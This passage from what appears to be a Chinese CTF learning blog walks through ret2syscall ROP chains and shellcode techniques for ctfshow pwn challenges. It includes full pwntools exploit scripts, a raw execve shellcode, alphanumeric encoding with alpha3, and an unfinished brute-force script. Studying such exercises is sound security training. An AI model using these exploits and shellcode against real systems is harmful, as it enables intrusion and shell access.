+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">read()：</span><br><span class="line">  ssize_t read(int fd,const void *buf,size_t nbytes); </span><br><span class="line">  //fd 为要读取的文件的描述符  0</span><br><span class="line">  //buf 为要读取的数据的缓冲区地址 </span><br><span class="line">  //nbytes 为要读取的数据的字节数</span><br><span class="line"></span><br><span class="line">  //read() 函数会从 fd 文件中读取 nbytes 个字节并保存到缓冲区 buf，</span><br><span class="line"> //成功则返回读取到的字节数（但遇到文件结尾则返回0），失败则返回 -1。</span><br><span class="line"> </span><br><span class="line">调用号：sys_read 的32位调用号 为 3 | 64位进程号为0</span><br></pre></td></tr></table></figure>
+
+<p>那么我们可以构造调用read的rop</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop eax 0x3 ret #32位下read系统调用号</span><br><span class="line">pop ebx 0 ret   #要读取的内容描述，0</span><br><span class="line">pop ecx adress ret #adress是需要读入的地址</span><br><span class="line">pop edx length ret #读入的长度</span><br><span class="line">int 0x80 #执行系统调用</span><br></pre></td></tr></table></figure>
+
+<p>这题写入地址就随便选一个bss段上就行0x080EB000,读入长度，”&#x2F;bin&#x2F;sh\x00”，不少于这个就行</p>
+<p>之后再进行execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)的调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">其中，该程序是 32 位，所以我们需要使得</span><br><span class="line">系统调用号，pop eax 0xb ret | 即 eax 应该为32位execve的进程号0xb</span><br><span class="line">第一个参数，pop ebx /bin/sh ret | 即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，pop ecx 0 ret | 即 ecx 应该为 0 </span><br><span class="line">第三个参数，pop edx 0 ret | 即 edx 应该为 0 </span><br><span class="line">最后，     int 0x80 | x86 通过 int 0x80 指令进行系统调用</span><br></pre></td></tr></table></figure>
+
+<p>这题不知道为什么ROPgadget找到的int 80h用不了，用的是ida这里的</p>
+<p>ROPgadget找到的这个用不了</p>
+<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-44-12.png" alt="Clip_2025-01-20_14-44-12"></p>
+<p>ida里面的这个可以用</p>
+<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-44-56.png" alt="Clip_2025-01-20_14-44-56"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28298</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x28</span>+<span class="number">4</span></span><br><span class="line">pop_eax = <span class="number">0x080bb2c6</span> <span class="comment"># pop eax ; ret</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806ecb0</span> <span class="comment"># pop edx ; pop ecx ; pop ebx ; ret</span></span><br><span class="line"><span class="comment">#bin_sh = next(elf.search(b&quot;/bin/sh&quot;))</span></span><br><span class="line">int_80h = <span class="number">0x0806F350</span> <span class="comment"># int 0x80</span></span><br><span class="line">bss = <span class="number">0x080EB000</span></span><br><span class="line"><span class="comment">#payload = flat([&#x27;A&#x27;*offset,pop_eax,0x3,pop_edx_ecx_ebx,0x10,bss,0,pop_eax,pop_edx_ecx_ebx,0,0,bss,int_80h])</span></span><br><span class="line">payload  = <span class="string">b&#x27;A&#x27;</span> *offset</span><br><span class="line">payload += p32(pop_eax) + p32(<span class="number">0x3</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx) + p32(<span class="number">0x10</span>) + p32(bss) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(int_80h)</span><br><span class="line"></span><br><span class="line">payload += p32(pop_eax) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss)</span><br><span class="line">payload += p32(int_80h)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h4><p>ctfshow pwn入门 pwn78</p>
+<p>没有canary没有pie</p>
+<p><img src="/2025/03/02/ret2syscall/image-20240524102221261.png" alt="image-20240524102221261"></p>
+<p>溢出函数</p>
+<p><img src="/2025/03/02/ret2syscall/image-20240524102839743.png" alt="image-20240524102839743"></p>
+<p>和32位类似，只是放参数的寄存器和调用号什么的变了,64位传参顺序是rdi &gt; rsi &gt; rdx &gt; rcx &gt; r8 &gt; r9 &gt; 栈上</p>
+<p>这题先调用read读入&#x2F;bin&#x2F;sh到bss段，再调用system(&#x2F;bin&#x2F;sh)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">调用read：</span><br><span class="line">pop rax 0 ret #将要调用的函数（read）的系统调用号存入rax(特殊，系统调用号就是放在rax里的)中，这里是0</span><br><span class="line">pop rdi 0 ret #read的第一个参数，表示标准读入</span><br><span class="line">pop rsi bss_addr ret #第二个参数，存放读入的位置，这里是bss上的一个地址</span><br><span class="line">pop rdx 0x10 ret #第三个参数，表示读入的长度，这里用0x10</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">调用execve(&quot;/bin/sh&quot;,NULL,NULL):</span><br><span class="line">pop rax 0x3b ret #execve的系统调用号，存入rax</span><br><span class="line">pop rdi bss_addr ret #将第一个参数/bin/sh,这里存在bss上，放入rdi中</span><br><span class="line">pop rsi 0 ret #第二个参数 0也就是NULL</span><br><span class="line">pop rdx 0 ret #第三个参数 0也就是NULL</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<p>在实际利用中可以省略syscall，因为使用了pwntools库的<code>remote</code>函数时，它会自动处理系统调用，因此你不需要手动添加<code>syscall</code>指令。当你发送payload时，pwntools会在内部自动构造ROP链，并执行<code>syscall</code>指令以触发系统调用。因此，即使没有明确写出<code>syscall</code>指令，<code>read</code>和<code>execve</code>系统调用仍然会被正确地触发。但是这题不知道为什么还是要加syscall 。</p>
+<p>syscall ret地址：</p>
+<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_15-18-11.png" alt="Clip_2025-01-20_15-18-11"></p>
+<p>首先利用ROPgadget找到能利用的rop指令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only <span class="string">&quot;pop|ret&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>首先是 pop rax ret </p>
+<p><img src="/2025/03/02/ret2syscall/image-20240524112906565.png" alt="image-20240524112906565"></p>
+<p>然后是pop rdi ret</p>
+<p><img src="/2025/03/02/ret2syscall/image-20240524112513371.png" alt="image-20240524112513371"></p>
+<p>再是rsi和rdx，可以找到两个一起的</p>
+<p><img src="/2025/03/02/ret2syscall/image-20240524113021888.png" alt="image-20240524113021888"></p>
+<p>还需要一个单独的ret，需要在read调用完之后ret再调用下一个函数execve</p>
+<p><img src="/2025/03/02/ret2syscall/image-20240524113426346.png" alt="image-20240524113426346"></p>
+<p>再找一个bss段的地址用于存放&#x2F;bin&#x2F;sh</p>
+<p><img src="/2025/03/02/ret2syscall/image-20240524113602768.png" alt="image-20240524113602768"></p>
+<p>exp：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28311</span>)</span><br><span class="line">pop_rax=<span class="number">0x46b9f8</span></span><br><span class="line">pop_rdi=<span class="number">0x4016c3</span></span><br><span class="line">pop_rdx_rsi=<span class="number">0x4377f9</span></span><br><span class="line">bss=<span class="number">0x6c2000</span></span><br><span class="line">syscall=<span class="number">0x45BAC5</span> <span class="comment">#syscall</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(pop_rax)+p64(<span class="number">0x0</span>)</span><br><span class="line">payload+=p64(pop_rdx_rsi)+p64(<span class="number">0x10</span>)+p64(bss)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(syscall)</span><br><span class="line"></span><br><span class="line">payload+=p64(pop_rax)+p64(<span class="number">0x3b</span>)</span><br><span class="line">payload+=p64(pop_rdx_rsi)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(bss)</span><br><span class="line">payload+=p64(syscall)</span><br><span class="line"><span class="comment">#execve(“/bin/sh”,0,0)</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)`</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/02/28/pwn-%E9%83%A8%E5%88%86shellcode%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/02/28/pwn-%E9%83%A8%E5%88%86shellcode%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">pwn(部分shellcode总结)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-02-28 15:00:10" itemprop="dateCreated datePublished" datetime="2025-02-28T15:00:10+08:00">2025-02-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-03-02 15:58:37" itemprop="dateModified" datetime="2025-03-02T15:58:37+08:00">2025-03-02</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>这里的shellcode的题目都是利用栈溢出了</p>
+<p>shellcode的获取方法：</p>
+<ol>
+<li>利用pwntools的shellcraft模块</li>
+<li><a target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/">网上查询</a></li>
+</ol>
+<ul>
+<li><a href="#%E7%9B%B4%E6%8E%A5%E5%86%99%E5%85%A5shellcode">直接写入shellcode</a><ul>
+<li><a href="#1.32%E4%BD%8D">1.32位</a></li>
+<li><a href="#1.64%E4%BD%8D">1.64位</a></li>
+</ul>
+</li>
+<li><a href="#%E5%9C%A8bss%E6%AE%B5%E5%86%99%E5%85%A5shellcode">在bss段写入shellcode</a><ul>
+<li><a href="#2.32%E4%BD%8D">2.32位</a></li>
+<li><a href="#2.64%E4%BD%8D">2.64位</a></li>
+</ul>
+</li>
+<li><a href="#pwntools%E7%9A%84shellcode%E9%95%BF%E5%BA%A6%E8%BF%87%E9%95%BF%E5%88%A9%E7%94%A8%E7%BD%91%E4%B8%8A%E6%89%BE%E7%9A%84shellcode">pwntools的shellcode长度过长利用网上找的shellcode</a></li>
+<li><a href="#shellcode%E6%98%AF%E9%9C%80%E8%A6%81%E7%94%B1%E5%A4%A7%E5%B0%8F%E5%86%99%E5%AD%97%E6%AF%8D%E5%8F%8A%E6%95%B0%E5%AD%97%E6%9E%84%E6%88%90">shellcode是需要由大小写字母及数字构成</a></li>
+<li><a href="#shellcode%E5%BC%80%E5%A4%B4%E4%B8%BA%60%5Cx00%60">shellcode开头为<code>\x00</code></a></li>
+<li><a href="#%E6%89%8B%E5%8A%A8%E5%86%99shellcode">手动写shellcode</a><ul>
+<li><a href="#x64">x64</a></li>
+<li><a href="#x32">x32</a></li>
+</ul>
+</li>
+<li><a href="#%E6%89%8B%E5%86%99open%EF%BC%8Cread%EF%BC%8Cwrite%E7%9A%84shellcode">手写open，read，write的shellcode</a></li>
+</ul>
+<h2 id="直接写入shellcode"><a href="#直接写入shellcode" class="headerlink" title="直接写入shellcode"></a>直接写入shellcode</h2><h3 id="1-32位"><a href="#1-32位" class="headerlink" title="1.32位"></a>1.32位</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./elf&#x27;)</span></span><br><span class="line"><span class="comment">#e=ELF(&#x27;./elf&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;域名&quot;</span>,端口)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload1=shellcode</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-64位"><a href="#1-64位" class="headerlink" title="1.64位"></a>1.64位</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./elf&#x27;)</span></span><br><span class="line"><span class="comment">#e=ELF(&#x27;./elf&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;域名&quot;</span>,端口)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">r.recvuntil(<span class="string">&quot;&quot;</span>) <span class="comment">#根据实际情况,也可能没有</span></span><br><span class="line">payload1=shellcode</span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="在bss段写入shellcode"><a href="#在bss段写入shellcode" class="headerlink" title="在bss段写入shellcode"></a>在bss段写入shellcode</h2><h3 id="2-32位"><a href="#2-32位" class="headerlink" title="2.32位"></a>2.32位</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;域名&quot;</span>,端口)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">buf2=<span class="number">0x804A080</span> <span class="comment">#根据实际情况</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;xxxxxxx&quot;</span>) <span class="comment">#根据实际情况,也可能没有</span></span><br><span class="line"></span><br><span class="line">payload1=shellcode.ljust(<span class="number">112</span>,<span class="string">b&quot;a&quot;</span>)+p32(buf2)  <span class="comment">#偏移量根据实际请况</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-64位"><a href="#2-64位" class="headerlink" title="2.64位"></a>2.64位</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) <span class="comment"># 修改了arch为&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保持连接信息不变</span></span><br><span class="line">r = remote(<span class="string">&quot;域名&quot;</span>,端口)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保使用的是64位shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">buf2=<span class="number">0x601000</span> <span class="comment"># 示例地址，实际使用时请替换为目标程序中的正确地址</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;xxxxxxx&quot;</span>) <span class="comment">#根据实际情况,也可能没有</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload，注意使用p64()来适应64位地址空间</span></span><br><span class="line">payload1=shellcode.ljust(<span class="number">112</span>,<span class="string">b&quot;a&quot;</span>)+p64(buf2) <span class="comment">#偏移量根据实际请况</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="pwntools的shellcode长度过长利用网上找的shellcode"><a href="#pwntools的shellcode长度过长利用网上找的shellcode" class="headerlink" title="pwntools的shellcode长度过长利用网上找的shellcode"></a>pwntools的shellcode长度过长利用网上找的shellcode</h2><p>例题ctfshow pwn61,这里还有注意有个leave不能直接在栈上写入shellcode，shellcode要放在v5之后即要放在v5首地址的24+8字节后</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r=process(<span class="string">&#x27;./pwn61&#x27;</span>)</span><br><span class="line"><span class="comment">#r = remote(&quot;域名&quot;,端口)</span></span><br><span class="line">shellcode =<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&quot;</span><span class="comment"># 22bytes</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;What&#x27;s this : [&quot;</span>)</span><br><span class="line"></span><br><span class="line">v5=<span class="built_in">int</span>(r.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;shellcode:&quot;</span>,<span class="built_in">len</span>(shellcode))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;v5:&quot;</span>,<span class="built_in">hex</span>(v5))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;But how to use it?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&quot;a&quot;</span>*<span class="number">24</span>+p64(v5+<span class="number">32</span>)+shellcode</span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="shellcode是需要由大小写字母及数字构成"><a href="#shellcode是需要由大小写字母及数字构成" class="headerlink" title="shellcode是需要由大小写字母及数字构成"></a>shellcode是需要由大小写字母及数字构成</h2><p>先要下载alpha3；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/TaQini/alpha3.git</span><br></pre></td></tr></table></figure>
+
+<p>应为github很不稳定所以这里推荐两种方法</p>
+<ol>
+<li>科学上网(其实是不文明上网)，自己理解<br><img src="/2025/02/28/pwn-%E9%83%A8%E5%88%86shellcode%E6%80%BB%E7%BB%93/1.jpg" alt="1"></li>
+<li>用bgithub.xyz替换github.com</li>
+</ol>
+<p>​    然后再利用pwntools生成一个shellcode<br>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;sc&#x27;</span>, <span class="string">&#x27;bw&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(sc)</span><br></pre></td></tr></table></figure></p>
+<p>   将上述代码保存成sc.py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd alpha3</span><br><span class="line">python3 sc.py &gt; sc</span><br></pre></td></tr></table></figure>
+
+<p>  使用alpha3生成string.printable （这里得用 python2）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./pwn65&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;域名&quot;</span>,端口)</span><br><span class="line">shellcode=<span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line">r.send(shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="shellcode开头为-x00"><a href="#shellcode开头为-x00" class="headerlink" title="shellcode开头为\x00"></a>shellcode开头为<code>\x00</code></h2><p>用脚本找</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> product([p8(k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)], repeat=i):</span><br><span class="line">        payload = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;&quot;</span>.join(j)</span><br><span class="line">        res = disasm(payload)</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            res != <span class="string">&quot;        ...&quot;</span></span><br><span class="line">            <span class="keyword">and</span> <span class="keyword">not</span> re.search(<span class="string">r&quot;\[\w*?\]&quot;</span>, res)</span><br><span class="line">            <span class="keyword">and</span> <span class="string">&quot;.byte&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> 